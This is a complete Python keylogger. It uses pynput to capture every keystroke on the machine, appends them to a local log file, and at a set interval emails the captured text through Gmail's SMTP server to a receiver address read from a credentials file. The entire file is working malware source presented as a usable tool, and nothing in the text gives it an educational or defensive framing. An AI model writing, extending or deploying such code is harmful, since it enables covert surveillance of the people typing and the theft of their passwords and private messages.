import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

def get_credentials():
    credentials_file = "credentials.txt"
    with open(credentials_file, 'r') as f:
        send_mail, password, receiver_mail, interval, pdf_location = f.read().splitlines()
    return send_mail, password, receiver_mail, int(interval), pdf_location

class KeyLogger:
    def __init__(self, email_address, email_password, receiver_email, interval, pdf_location):
        self.email_address = email_address
        self.email_password = email_password
        self.receiver_email = receiver_email
        self.start_time = time.time()
        self.interval = interval  # 5 minutes
        self.log_file = "keylog.txt"  # File to store the log
        self.log = ""  # Initialize log variable
        self.start_logging()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            else:
                self.log += f' [{key}] '

    def send_email(self):
        msg = MIMEMultipart()
        msg.attach(MIMEText(self.log))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
            connection.login(self.email_address, self.email_password)
            connection.sendmail(from_addr=self.email_address, to_addrs=self.receiver_email, msg=msg.as_string())

    def write_log_to_file(self):
        with open(self.log_file, 'a') as f:
            f.write(self.log)

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while True:
                if time.time() - self.start_time > self.interval:
                    if self.log:
                        self.write_log_to_file()  # Write log to file
                        self.send_email()
                        self.log = ""
                    self.start_time = time.time()
                listener.join(1)

if __name__ == "__main__":
    send_mail, password, receiver_mail, interval, pdf_location = get_credentials()
    keylogger = KeyLogger(send_mail, password, receiver_mail, interval=interval, pdf_location=pdf_location)
    